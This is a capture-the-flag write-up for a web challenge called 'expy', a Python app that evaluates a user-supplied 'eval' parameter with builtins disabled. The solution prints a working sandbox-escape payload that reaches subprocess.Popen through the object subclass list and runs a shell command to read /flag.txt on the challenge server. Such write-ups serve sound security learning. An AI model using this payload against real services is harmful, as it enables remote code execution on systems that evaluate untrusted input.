# expy
![](https://img.shields.io/badge/category-web-blue)
![](https://img.shields.io/badge/points-300-orange)

## Description
Quick and simple.

The flag is in `/flag.txt`.

[expy.py](https://ctf.mcpt.ca/media/problem/dKa3CixJkhhCZU3RmoaBIze9GcQZ74Uja9uGg7RRkVc/expy.py)

## Solution
We can see that sending an `eval` parameter to the page causes it to evaluate our input. However, all the Python builtins are disabled!

That's not a problem, because of Python's sketchy inheritance system. Every class stores a list of all classes it inherits, and all classes that inherit it. While builtin classes are disabled, there is one class that they can't disable: string.

```py
"bob".__class__             => <class 'str'>
"bob".__class__.__mro__     => (<class 'str'>, <class 'object'>)
```

Now since everything inherits object, we can get a list of all object subclasses.
```py
"bob".__class__.__mro__[1].__subclasses__()   => returns a whole list of objects that inherit object
```

Now, we can find some useful function, like subprocess.Popen to give us remote code execution.

```
http://7e44b50.0x16.ink/?eval=%27bob%27.__class__.__mro__%5B1%5D.__subclasses__%28%29[224](%22cat%20/flag.txt%22,%20shell=True,%20stdout=-1).communicate() 

http://7e44b50.0x16.ink/?eval='bob'.__class__                   <== get the string class
                                   .__mro__[1]                  <== get the object class
                                   .__subclasses__()[224]       <== find the subprocess.Popen
                                   ("cat /flag.txt", shell=True, stdout=-1).communicate()
```

Note that the 224 offset may be different depending on the environment. It must be the index that corresponds to Popen.


Flag: `placeholder - problem hidden`
